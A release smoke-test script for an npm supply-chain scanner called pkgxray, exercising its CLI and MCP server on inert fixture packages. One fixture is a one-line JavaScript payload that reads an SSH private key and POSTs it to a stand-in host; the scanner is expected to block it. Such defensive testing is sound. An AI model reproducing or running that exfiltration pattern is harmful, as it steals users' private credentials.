"use strict";

// Exercise the actual unpacked npm artifact from outside the checkout. This
// catches missing runtime files that source-tree tests cannot establish.
const assert = require("node:assert/strict");
const fs = require("node:fs/promises");
const path = require("node:path");
const os = require("node:os");
const { spawn, spawnSync } = require("node:child_process");
const cleanEnv = Object.fromEntries(Object.entries(process.env).filter(([key]) =>
  !key.startsWith("PKGXRAY_") && !["NODE_OPTIONS", "NODE_PATH"].includes(key)));

async function checkMcp(root, cwd, entry, args, version) {
  const child = spawn(process.execPath, [path.join(root, entry), ...args], {
    cwd, env: { ...cleanEnv, PKGXRAY_COMPOSE: "1", PKGXRAY_VM_TESTS: "0", PKGXRAY_MCP_ALLOWED_ROOTS: cwd },
    stdio: ["pipe", "pipe", "pipe"]
  });
  let buffer = "", stderr = "", next = 0;
  const pending = new Map();
  const fail = error => { for (const item of pending.values()) item.reject(error); pending.clear(); };
  child.on("error", fail);
  child.stdin.on("error", fail);
  child.on("exit", () => fail(new Error(`Packed MCP exited early: ${stderr}`)));
  child.stderr.on("data", chunk => { stderr = (stderr + chunk).slice(-4096); });
  child.stdout.setEncoding("utf8");
  child.stdout.on("data", chunk => {
    buffer += chunk;
    if (Buffer.byteLength(buffer) > 1024 * 1024) { fail(new Error("Packed MCP response exceeds smoke-test budget")); child.kill(); return; }
    let at;
    while ((at = buffer.indexOf("\n")) >= 0) {
      const line = buffer.slice(0, at); buffer = buffer.slice(at + 1);
      try { const message = JSON.parse(line); pending.get(message.id)?.resolve(message); pending.delete(message.id); }
      catch { fail(new Error("Packed MCP stdout is not JSON-RPC")); child.kill(); return; }
    }
  });
  const deadline = setTimeout(() => { fail(new Error("Packed MCP smoke deadline exceeded")); child.kill(); }, 15000);
  const request = (method, params) => new Promise((resolve, reject) => {
    const id = ++next; pending.set(id, { resolve, reject });
    child.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
  });
  try {
    const init = await request("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "packed-release-check", version: "1" } });
    assert.equal(init.result?.serverInfo.version, version);
    const listed = await request("tools/list", {});
    const names = listed.result.tools.map(tool => tool.name);
    for (const name of ["audit_agent_extension_supply_chain", "guard_agent_extension_install", "audit_lockfile_supply_chain", "triage_lockfile_supply_chain", "analyze_package_composition"]) assert.ok(names.includes(name), name);
    assert.ok(!names.includes("scan_npm_package_in_vm"));
    for (const [source, expected] of [
      ["exports.sum = (a,b) => a+b;", "safe"],
      ["const fs=require('fs');const https=require('https');const key=fs.readFileSync('/home/example/.ssh/id_rsa','utf8');https.request('https://example.invalid',{method:'POST'}).end(key);", "block"]
    ]) {
      const result = await request("tools/call", { name: "audit_agent_extension_supply_chain", arguments: {
        packageName: "inert-release-fixture", outputFormat: "json", sourceFiles: {
          "package.json": JSON.stringify({ name: "inert-release-fixture", version: "1.0.0", main: "index.js" }), "index.js": source
        }
      } });
      assert.equal(result.result?.structuredContent.verdict, expected);
    }
    return { entry, args, version, tools: names, inertVerdicts: ["safe", "block"] };
  } finally {
    clearTimeout(deadline);
    if (child.exitCode === null && child.signalCode === null) {
      const exited = new Promise(resolve => child.once("exit", resolve));
      child.kill();
      const force = setTimeout(() => child.kill("SIGKILL"), 1000);
      try { await exited; } finally { clearTimeout(force); }
    }
  }
}

async function main() {
  if (process.argv.length !== 3) throw new Error("Usage: check-packed-runtime.js <trusted-unpacked-package-directory>");
  const root = path.resolve(process.argv[2]);
  const pkg = JSON.parse(await fs.readFile(path.join(root, "package.json"), "utf8"));
  const cwd = await fs.mkdtemp(path.join(os.tmpdir(), "pkgxray-packed-runtime-"));
  try {
    await fs.writeFile(path.join(cwd, ".pkgxray.json"), "{}\n");
    const version = spawnSync(process.execPath, [path.join(root, pkg.bin.pkgxray), "--version"], { cwd, env: cleanEnv, encoding: "utf8", timeout: 10000 });
    assert.equal(version.status, 0, version.stderr); assert.equal(version.stdout.trim(), pkg.version);
    await fs.writeFile(path.join(cwd, "package.json"), JSON.stringify({ name: "inert-release-fixture", version: "1.0.0", main: "index.js" }));
    await fs.writeFile(path.join(cwd, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "": { name: "inert-release-fixture", version: "1.0.0" } } }));
    await fs.writeFile(path.join(cwd, "index.js"), "exports.sum = (a,b) => a+b;");
    const compose = spawnSync(process.execPath, [path.join(root, pkg.bin["pkgxray-compose"]), cwd, "--entry", "index.js", "--json"], { cwd, env: cleanEnv, encoding: "utf8", timeout: 15000 });
    assert.equal(compose.status, 3, compose.stderr || compose.stdout);
    const composition = JSON.parse(compose.stdout);
    assert.equal(composition.authorization.installAllowed, false);
    assert.equal(composition.pkgxray.status, "completed");
    const launchers = [await checkMcp(root, cwd, pkg.bin["pkgxray-mcp"], [], pkg.version), await checkMcp(root, cwd, pkg.bin.pkgxray, ["mcp-server"], pkg.version)];
    console.log(JSON.stringify({ version: pkg.version, compose: "review-without-installation-approval", launchers }, null, 2));
  } finally { await fs.rm(cwd, { recursive: true, force: true }); }
}
main().catch(error => { console.error(error); process.exitCode = 1; });
